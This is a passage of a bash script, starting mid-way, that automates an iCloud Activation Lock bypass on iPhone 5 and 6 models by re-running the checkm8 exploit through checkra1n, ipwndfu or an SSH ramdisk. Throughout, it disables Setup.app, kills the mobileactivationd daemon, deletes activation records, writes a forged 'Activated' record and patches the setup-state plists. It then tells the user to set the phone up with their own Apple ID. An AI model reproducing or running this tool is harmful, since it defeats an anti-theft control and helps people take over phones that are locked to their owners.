mount -t apfs /dev/disk0s1s2 /mnt2 2>/dev/null || true
# Older HFS+ (iPhone 5 on iOS 10)
mount -t hfs /dev/disk0s1s1 /mnt1 2>/dev/null || true
mount -t hfs /dev/disk0s1s2 /mnt2 2>/dev/null || true

# Find root
if [ -d "/mnt1/Applications" ]; then
    R="/mnt1"; D="/mnt2"
    echo "[device] SSHRD mode: root=$R data=$D"
else
    R=""; D=""
    echo "[device] Normal jailbreak mode"
fi

# ── Remove Setup.app ──
SA="${R}/Applications/Setup.app"
if [ -d "$SA" ]; then
    mv "$SA" "${SA}.disabled" 2>/dev/null
    if [ ! -d "$SA" ]; then
        echo "[device] ✓ Setup.app disabled"
    else
        echo "[device] ✗ Setup.app move FAILED (read-only filesystem)"
    fi
else
    find ${R:=/}/ -maxdepth 3 -name "Setup.app" -type d 2>/dev/null | while read p; do
        mv "$p" "${p}.disabled" 2>/dev/null && echo "[device] ✓ Disabled: $p"
    done
fi

# ── Kill activation daemon ──
echo "[device] Disabling mobileactivationd..."
DP="${R}/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist"
[ -f "$DP" ] && mv "$DP" "${DP}.disabled" 2>/dev/null
launchctl unload "$DP" 2>/dev/null || true
killall -9 mobileactivationd 2>/dev/null || true
echo "[device] ✓ Daemon killed"

# ── Clear activation records ──
echo "[device] Clearing activation records..."
for base in "${D}/var/root/Library/Lockdown" "/var/root/Library/Lockdown" \
            "${D}/var/mobile/Library/mad" "/var/mobile/Library/mad"; do
    [ -z "$base" ] && continue
    rm -rf "${base}/activation_records/" 2>/dev/null || true
    mkdir -p "${base}/activation_records" 2>/dev/null || true
done
echo "[device] ✓ Records cleared"

# ── Patch activation state ──
echo "[device] Patching activation state..."
for plist in "${D}/var/root/Library/Lockdown/data_ark.plist" \
             "/var/root/Library/Lockdown/data_ark.plist"; do
    [ -z "$plist" ] && continue
    if [ -f "$plist" ] || [ -n "$D" ]; then
        /usr/bin/defaults write "$plist" ActivationState -string "Activated" 2>/dev/null || true
        /usr/bin/defaults write "$plist" BrickState -bool false 2>/dev/null || true
        echo "[device] ✓ Patched $plist"
    fi
done

# Write stub activation record
for base in "${D}/var/root/Library/Lockdown" "/var/root/Library/Lockdown"; do
    [ -z "$base" ] && continue
    STUB="${base}/activation_records/activation_record.plist"
    cat > "$STUB" 2>/dev/null << 'ENDPLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>ActivationState</key>
    <string>Activated</string>
</dict>
</plist>
ENDPLIST
    chmod 644 "$STUB" 2>/dev/null || true
    echo "[device] ✓ Stub ticket: $STUB"
done

# ── Mark setup complete ──
echo "[device] Marking setup done..."
for plist in "${D}/var/mobile/Library/Preferences/com.apple.purplebuddy.plist" \
             "/var/mobile/Library/Preferences/com.apple.purplebuddy.plist"; do
    [ -z "$plist" ] && continue
    /usr/bin/defaults write "$plist" SetupDone -bool true 2>/dev/null || true
    /usr/bin/defaults write "$plist" SetupFinishedAllSteps -bool true 2>/dev/null || true
done
echo "[device] ✓ Setup flagged complete"

# ── Refresh ──
uicache --all 2>/dev/null || true

echo ""
echo "[device] ══════════════════════════════"
echo "[device] BYPASS COMPLETE"
echo "[device] ══════════════════════════════"
BYPASS_PAYLOAD

    echo ""
    success "Bypass executed."

    info "Rebooting device..."
    $SSH "reboot" 2>/dev/null || true
    [ -n "$proxy_pid" ] && kill $proxy_pid 2>/dev/null || true
    sleep 5
}

# ─── Tethered Reboot ───
tethered_reboot() {
    header "Phase 5: Tethered Boot"

    echo "  Device is rebooting. checkm8 lives in RAM, so we"
    echo "  re-exploit to boot with the patched filesystem."
    echo ""
    echo "  Put device in DFU now (same button combo)."
    echo ""

    local elapsed=0
    while ! system_profiler SPUSBDataType 2>/dev/null | grep -qi "Apple Mobile Device (DFU)"; do
        sleep 1; elapsed=$((elapsed + 1))
        [ $((elapsed % 15)) -eq 0 ] && echo "  ... ${elapsed}s — DFU button combo now"
        [ $elapsed -ge 180 ] && { fail "Timed out."; return 1; }
    done
    success "DFU detected."

    if [ "$BYPASS_METHOD" = "checkra1n" ]; then
        info "Re-running checkra1n..."
        if [ "$USE_CHECKRA1N_TUI" -eq 1 ]; then
            checkra1n -t
        else
            if ! checkra1n -c -v; then
                warn "Re-run with -c failed; trying interactive mode."
                checkra1n -t
            fi
        fi
    else
        info "Re-running ipwndfu + SSHRD boot..."
        cd "$SCRIPT_DIR/ipwndfu" && (python3 ./ipwndfu -p 2>/dev/null || python2 ./ipwndfu -p 2>/dev/null) || true
        cd "$SCRIPT_DIR/sshrd" && ./sshrd.sh boot 2>/dev/null || true
        cd "$SCRIPT_DIR"
    fi

    info "Waiting 60s for boot..."
    sleep 60
    success "Device should be past Activation Lock."
}

# ─── Verify ───
verify() {
    header "Verification"
    echo ""
    echo "  ${GREEN}✓ Home Screen / Hello setup (no lock)${NC} = success"
    echo "  ${RED}✗ Activation Lock screen${NC} = re-DFU and run: bash reboot.sh"
    echo ""
    echo "  If it worked → set up with YOUR Apple ID"
    echo "  If phone ever dies → plug in, run: bash reboot.sh"
    echo ""
    success "Device done."
}

# ─── Main ───
main() {
    echo ""
    echo "  ╔═══════════════════════════════════════════╗"
    echo "  ║  iCloud Activation Lock Bypass             ║"
    echo "  ║  iPhone 5 / 6 / 6 Plus / 6              ║"
    echo "  ╚═══════════════════════════════════════════╝"
    echo ""
    parse_args "$@"
    log "=== Session started ==="

    check_deps
    detect_device
    if [ $? -ne 0 ]; then
        warn "Unable to continue without detected device information."
        warn "If you are in DFU black screen, pass --model (i6/i6p/i5/i7) and retry."
        return 1
    fi
    prompt_workflow

    if [ "$WORKFLOW_MODE" = "reset" ]; then
        run_factory_reset
        return $?
    fi

    if [ "$BYPASS_METHOD" = "sshrd" ]; then
        # SSHRD flow: DFU → create ramdisk → boot → bypass → reboot (no tethered boot needed)
        if [ "$DEVICE_MODE" != "dfu" ]; then
            enter_dfu
        fi
        sshrd_ensure_ready
        sshrd_boot
        bypass_via_sshrd
        verify
        return
    fi

    if [ "$DEVICE_MODE" = "dfu" ]; then
        [ "$BYPASS_METHOD" = "checkra1n" ] && jailbreak_checkra1n || jailbreak_ipwndfu
        bypass_activation
        tethered_reboot
        verify
        return
    fi

    if [ "$BYPASS_METHOD" = "checkra1n" ] && [ "$USE_CHECKRA1N_TUI" -eq 1 ]; then
        info "checkra1n interactive mode enabled: skipping manual DFU step."
        info "checkra1n will guide device recovery→DFU for this device."
    else
        enter_dfu
    fi
    [ "$BYPASS_METHOD" = "checkra1n" ] && jailbreak_checkra1n || jailbreak_ipwndfu
    bypass_activation
    tethered_reboot
    verify
}

main "$@"
